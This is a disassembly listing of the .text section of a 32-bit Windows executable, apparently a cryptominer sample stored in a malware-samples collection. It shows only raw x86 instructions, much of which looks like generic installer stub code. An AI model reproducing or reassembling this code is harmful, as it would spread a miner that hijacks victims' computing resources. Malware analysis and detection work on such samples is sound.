
malware_samples/miner/6578f5634373986205171429bc39c1ec267c64b76863e0f84c15b3951dff4885.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 28 9a 42 00    	mov    0x429a28,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 5c 82 40 00    	call   *0x40825c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 30 9a 42 00    	mov    0x429a30,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 60 82 40 00    	call   *0x408260
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 64 82 40 00    	call   *0x408264
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 54 80 40 00    	mov    0x408054,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 58 80 40 00    	call   *0x408058
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 68 82 40 00    	call   *0x408268
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 5c 80 40 00    	call   *0x40805c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 60 80 40 00    	call   *0x408060
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 50 80 40 00    	mov    0x408050,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 20 8a 42 00       	push   $0x428a20
  401155:	57                   	push   %edi
  401156:	ff 15 6c 82 40 00    	call   *0x40826c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 70 82 40 00    	call   *0x408270
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 48 9a 42 00       	mov    0x429a48,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 4c 9a 42 00    	cmp    0x429a4c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 4c 9a 42 00    	cmp    0x429a4c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d 48 9a 42 00    	mov    0x429a48,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 4c 9a 42 00    	cmp    0x429a4c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 4c 9a 42 00    	cmp    0x429a4c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 48 9a 42 00       	mov    0x429a48,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 4c 9a 42 00    	cmp    %esi,0x429a4c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 4c 9a 42 00    	cmp    0x429a4c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 30 9a 42 00       	mov    0x429a30,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 4c 9a 42 00    	mov    0x429a4c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 48 9a 42 00    	mov    0x429a48,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 a0 42 00       	mov    $0x42a000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 56 51 00 00       	call   0x4064dc
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 50 9a 42 00    	mov    0x429a50,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 0c 8a 42 00    	add    %eax,0x428a0c
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 f4 89 42 00    	push   0x4289f4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 0c 8a 42 00    	push   0x428a0c
  4013e4:	ff 15 48 81 40 00    	call   *0x408148
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 58 82 40 00    	call   *0x408258
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 30 9a 42 00    	mov    0x429a30,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 c8 ad 40 00       	push   $0x40adc8
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 d0 41 00 00       	call   0x405601
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 28 9a 42 00       	mov    0x429a28,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d cc             	lea    -0x34(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401453:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401456:	be 00 a0 42 00       	mov    $0x42a000,%esi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 ce                	add    %esi,%ecx
  401468:	8b f8                	mov    %eax,%edi
  40146a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40146d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401470:	c1 e7 0b             	shl    $0xb,%edi
  401473:	89 0d 24 ce 40 00    	mov    %ecx,0x40ce24
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 fe                	add    %esi,%edi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 cc 17 00 00    	ja     0x402c56
  40148a:	ff 24 8d 68 2c 40 00 	jmp    *0x402c68(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 69 41 00 00       	call   0x405601
  401498:	e9 2c 0f 00 00       	jmp    0x4023c9
  40149d:	ff 05 ec 89 42 00    	incl   0x4289ec
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 1d 0f 00 00    	je     0x4023c9
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 20 82 40 00    	call   *0x408220
  4014b3:	e9 11 0f 00 00       	jmp    0x4023c9
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 96 17 00 00       	jmp    0x402c61
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 2f 41 00 00       	call   0x405601
  4014d2:	e9 7f 17 00 00       	jmp    0x402c56
  4014d7:	53                   	push   %ebx
  4014d8:	e8 d3 18 00 00       	call   0x402db0
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 d4 80 40 00    	call   *0x4080d4
  4014f0:	e9 61 17 00 00       	jmp    0x402c56
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 24 82 40 00    	call   *0x408224
  4014fe:	e9 53 17 00 00       	jmp    0x402c56
  401503:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401506:	7f 39                	jg     0x401541
  401508:	7d 0e                	jge    0x401518
  40150a:	8b 04 85 a0 9a 42 00 	mov    0x429aa0(,%eax,4),%eax
  401511:	a3 2c ce 40 00       	mov    %eax,0x40ce2c
  401516:	eb 0f                	jmp    0x401527
  401518:	c1 e0 02             	shl    $0x2,%eax
  40151b:	8b 88 a0 9a 42 00    	mov    0x429aa0(%eax),%ecx
  401521:	89 88 00 9b 42 00    	mov    %ecx,0x429b00(%eax)
  401527:	6a 01                	push   $0x1
  401529:	e8 82 18 00 00       	call   0x402db0
  40152e:	59                   	pop    %ecx
  40152f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401532:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401535:	89 04 8d a0 9a 42 00 	mov    %eax,0x429aa0(,%ecx,4)
  40153c:	e9 15 17 00 00       	jmp    0x402c56
  401541:	c1 e0 02             	shl    $0x2,%eax
  401544:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401547:	8d 88 a0 9a 42 00    	lea    0x429aa0(%eax),%ecx
  40154d:	8b 80 00 9b 42 00    	mov    0x429b00(%eax),%eax
  401553:	89 01                	mov    %eax,(%ecx)
  401555:	0f 8d fb 16 00 00    	jge    0x402c56
  40155b:	a1 2c ce 40 00       	mov    0x40ce2c,%eax
  401560:	89 01                	mov    %eax,(%ecx)
  401562:	e9 ef 16 00 00       	jmp    0x402c56
  401567:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40156a:	8d 34 85 a0 9a 42 00 	lea    0x429aa0(,%eax,4),%esi
  401571:	33 c0                	xor    %eax,%eax
  401573:	8b 0e                	mov    (%esi),%ecx
  401575:	3b cb                	cmp    %ebx,%ecx
  401577:	0f 94 c0             	sete   %al
  40157a:	23 4d dc             	and    -0x24(%ebp),%ecx
  40157d:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
  401581:	89 0e                	mov    %ecx,(%esi)
  401583:	e9 d9 16 00 00       	jmp    0x402c61
  401588:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40158b:	ff 34 85 a0 9a 42 00 	push   0x429aa0(,%eax,4)
  401592:	57                   	push   %edi
  401593:	e9 38 16 00 00       	jmp    0x402bd0
  401598:	8b 0d f0 89 42 00    	mov    0x4289f0,%ecx
  40159e:	8b 35 28 82 40 00    	mov    0x408228,%esi
  4015a4:	3b cb                	cmp    %ebx,%ecx
  4015a6:	74 09                	je     0x4015b1
  4015a8:	ff 75 d4             	push   -0x2c(%ebp)
  4015ab:	51                   	push   %ecx
  4015ac:	ff d6                	call   *%esi
  4015ae:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4015b1:	8b 0d 04 8a 42 00    	mov    0x428a04,%ecx
  4015b7:	3b cb                	cmp    %ebx,%ecx
  4015b9:	0f 84 97 16 00 00    	je     0x402c56
  4015bf:	50                   	push   %eax
  4015c0:	51                   	push   %ecx
  4015c1:	ff d6                	call   *%esi
  4015c3:	e9 8e 16 00 00       	jmp    0x402c56
  4015c8:	6a f0                	push   $0xfffffff0
  4015ca:	e8 03 18 00 00       	call   0x402dd2
  4015cf:	ff 75 d4             	push   -0x2c(%ebp)
  4015d2:	50                   	push   %eax
  4015d3:	ff 15 d8 80 40 00    	call   *0x4080d8
  4015d9:	85 c0                	test   %eax,%eax
  4015db:	0f 85 75 16 00 00    	jne    0x402c56
  4015e1:	e9 74 13 00 00       	jmp    0x40295a
  4015e6:	6a f0                	push   $0xfffffff0
  4015e8:	e8 e5 17 00 00       	call   0x402dd2
  4015ed:	50                   	push   %eax
  4015ee:	89 45 08             	mov    %eax,0x8(%ebp)
  4015f1:	e8 00 49 00 00       	call   0x405ef6
  4015f6:	8b f0                	mov    %eax,%esi
  4015f8:	3b f3                	cmp    %ebx,%esi
  4015fa:	74 61                	je     0x40165d
  4015fc:	6a 5c                	push   $0x5c
  4015fe:	56                   	push   %esi
  4015ff:	e8 74 48 00 00       	call   0x405e78
  401604:	8b f0                	mov    %eax,%esi
  401606:	66 8b 3e             	mov    (%esi),%di
  401609:	66 89 1e             	mov    %bx,(%esi)
  40160c:	66 3b fb             	cmp    %bx,%di
  40160f:	75 1f                	jne    0x401630
  401611:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401614:	74 1a                	je     0x401630
  401616:	e8 2c 45 00 00       	call   0x405b47
  40161b:	85 c0                	test   %eax,%eax
  40161d:	74 11                	je     0x401630
  40161f:	ff 75 08             	push   0x8(%ebp)
  401622:	e8 a9 44 00 00       	call   0x405ad0
  401627:	3b c3                	cmp    %ebx,%eax
  401629:	74 28                	je     0x401653
  40162b:	ff 45 fc             	incl   -0x4(%ebp)
  40162e:	eb 08                	jmp    0x401638
  401630:	ff 75 08             	push   0x8(%ebp)
  401633:	e8 f2 44 00 00       	call   0x405b2a
  401638:	3b c3                	cmp    %ebx,%eax
  40163a:	74 17                	je     0x401653
  40163c:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401641:	75 0d                	jne    0x401650
  401643:	ff 75 08             	push   0x8(%ebp)
  401646:	ff 15 dc 80 40 00    	call   *0x4080dc
  40164c:	a8 10                	test   $0x10,%al
  40164e:	75 03                	jne    0x401653
  401650:	ff 45 fc             	incl   -0x4(%ebp)
  401653:	66 89 3e             	mov    %di,(%esi)
  401656:	46                   	inc    %esi
  401657:	46                   	inc    %esi
  401658:	66 3b fb             	cmp    %bx,%di
  40165b:	75 9f                	jne    0x4015fc
  40165d:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401660:	74 2d                	je     0x40168f
  401662:	6a e6                	push   $0xffffffe6
  401664:	e8 ba fd ff ff       	call   0x401423
  401669:	ff 75 08             	push   0x8(%ebp)
  40166c:	68 00 50 43 00       	push   $0x435000
  401671:	e8 06 4f 00 00       	call   0x40657c
  401676:	ff 75 08             	push   0x8(%ebp)
  401679:	ff 15 e0 80 40 00    	call   *0x4080e0
  40167f:	85 c0                	test   %eax,%eax
  401681:	0f 85 cf 15 00 00    	jne    0x402c56
  401687:	ff 45 fc             	incl   -0x4(%ebp)
  40168a:	e9 c7 15 00 00       	jmp    0x402c56
  40168f:	6a f5                	push   $0xfffffff5
  401691:	e9 87 0c 00 00       	jmp    0x40231d
  401696:	53                   	push   %ebx
  401697:	e8 36 17 00 00       	call   0x402dd2
  40169c:	50                   	push   %eax
  40169d:	e8 37 52 00 00       	call   0x4068d9
  4016a2:	e9 ad 06 00 00       	jmp    0x401d54
  4016a7:	6a d0                	push   $0xffffffd0
  4016a9:	e8 24 17 00 00       	call   0x402dd2
  4016ae:	6a df                	push   $0xffffffdf
  4016b0:	8b f0                	mov    %eax,%esi
  4016b2:	e8 1b 17 00 00       	call   0x402dd2
  4016b7:	6a 13                	push   $0x13
  4016b9:	8b f8                	mov    %eax,%edi
  4016bb:	e8 12 17 00 00       	call   0x402dd2
  4016c0:	57                   	push   %edi
  4016c1:	56                   	push   %esi
  4016c2:	ff 15 e4 80 40 00    	call   *0x4080e4
  4016c8:	85 c0                	test   %eax,%eax
  4016ca:	74 07                	je     0x4016d3
  4016cc:	6a e3                	push   $0xffffffe3
